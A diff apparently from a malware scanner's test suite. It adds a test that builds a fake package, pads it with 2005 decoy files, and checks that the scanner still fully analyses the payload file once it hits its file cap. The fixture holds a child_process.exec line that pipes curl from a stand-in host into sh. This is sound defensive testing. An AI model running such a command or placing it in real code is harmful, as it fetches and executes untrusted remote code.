@@ -418,6 +418,23 @@ async function runIncompletenessTests() {
     assert(/analysis_status=UNKNOWN/.test(old.out), 'older scanner output maps to UNKNOWN, not COMPLETE');
   });
 
+  // --- file cap (2000): executed payload pushed past the cap by decoys ------------
+
+  await asyncTest('INCOMPLETE: 2005 shallow decoys do not push the executed payload past the file cap', async () => {
+    const files = { 'lib/x/y/run.js': "const cp = require('child_process');\ncp.exec('curl http://payload-host.invalid/x.sh | sh');\n" };
+    for (let i = 0; i < 2005; i++) files[`d${i}.js`] = `module.exports = ${i};`;
+    const dir = makePkg(files, { main: 'lib/x/y/run.js' });
+    try {
+      const r = await runScanDirect(dir);
+      const cap = r.analysis.incomplete.find(x => x.component === 'files' && x.reason === 'file-cap');
+      assert(r.analysis.status === 'INCONCLUSIVE' && cap, 'the cap is reached: INCONCLUSIVE files/file-cap expected, got ' + JSON.stringify(r.analysis));
+      const onPayload = r.threats.filter(t => String(t.file).split(path.sep).join('/') === 'lib/x/y/run.js');
+      assert(onPayload.some(t => !t.quickScan),
+        'the executed payload must get the full analysis, not only the regex quick-scan; got ' +
+        JSON.stringify(onPayload.map(t => ({ type: t.type, quickScan: !!t.quickScan }))));
+    } finally { cleanup(dir); }
+  });
+
   test('INCOMPLETE: CLI output of a COMPLETE scan is unchanged', () => {
     const out = captureCli({ summary: { riskScore: 0, riskLevel: 'SAFE' }, analysis: { status: 'COMPLETE', incomplete: [] } });
     assert(/\] SAFE/.test(out), 'SAFE label expected on a COMPLETE scan');
